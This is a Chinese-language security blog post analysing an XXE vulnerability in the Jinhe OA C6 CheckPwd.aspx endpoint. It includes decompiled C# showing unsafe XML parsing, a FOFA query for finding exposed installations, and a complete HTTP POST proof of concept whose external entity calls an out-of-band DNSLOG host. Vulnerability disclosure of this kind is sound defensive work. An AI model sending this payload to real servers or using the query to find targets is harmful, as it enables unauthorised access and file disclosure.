---
title: "金和OA CheckPwd.aspx XXE漏洞"
source: https://mrxn.net/jswz/jhsoft-CheckPwd-xxe.html
asset_dir: assets/金和oa-checkpwd.aspx-xxe漏洞
---

# 金和OA CheckPwd.aspx XXE漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/7/29 12:02
- 643浏览
- [0评论](#comment)
- 9分钟阅读

深入探索

网络安全会议

漏洞扫描服务

网络安全课程

---

# 漏洞简介

金和网络是专业信息化服务商,为城市监管部门提供了互联网+监管解决方案,为企事业单位提供组织协同OA系统开发平台,电子政务一体化平台,智慧电商平台等服务。金和OA C6 `CheckPwd.aspx` 接口处存在[XXE](https://mrxn.net/tag/XXE)漏洞，未授权的攻击者可以通过此漏洞读取服务器上敏感文件或探测内网服务信息，进一步利用可导致服务器失陷。

漏洞预警服务

# 影响版本

金和OA C6

# fofa语法

> app="金和网络-金和OA"

# 漏洞分析

直接根据 CheckPwd.aspx 在 bin 目录下查找 JHSoft.Web.WorkFlat.dll 将其进行反编译后找到 CheckPwd 的处理逻辑

```
protected void Page_Load(object sender, EventArgs e)
{
  string end = ((TextReader) new StreamReader(this.Request.InputStream)).ReadToEnd();
  XmlDocument xmlDocument = new XmlDocument();
  xmlDocument.LoadXml(end);
  string innerText = xmlDocument.DocumentElement.ChildNodes.Item(0).InnerText;
```

请求内容直接使 `xmlDataDocument.LoadXml` 解析，造成[XXE漏洞](https://mrxn.net/tag/XXE)。

# 漏洞复现

```
POST /c6/Jhsoft.Web.workflat/CheckPwd.aspx/ HTTP/1.1
Host: jhsoft.mrxn.net
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://xxe.vk8uek6g.dnslog.pt/xxe_test">
%remote;]>
```

深入探索

代码安全审计

SQL注入检测工具

SQL

在DNSLOG平台成功收到请求

网络安全

[![金和OA CheckPwd.aspx XXE漏洞](images/img-001-a17b8968ebbd.webp)](https://image.mrxn.net/3c4e418dd4c74201b148398cef7e9368.webp)

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
- [#XXE](https://mrxn.net/tag/XXE)
- [#asp.net](https://mrxn.net/tag/asp.net)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.影响版本](#toc-2-)
- [3.fofa语法](#toc-3-)
- [4.漏洞分析](#toc-4-)
- [5.漏洞复现](#toc-5-)

  
  

![](data:image/png;base64,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)

手机扫码阅读
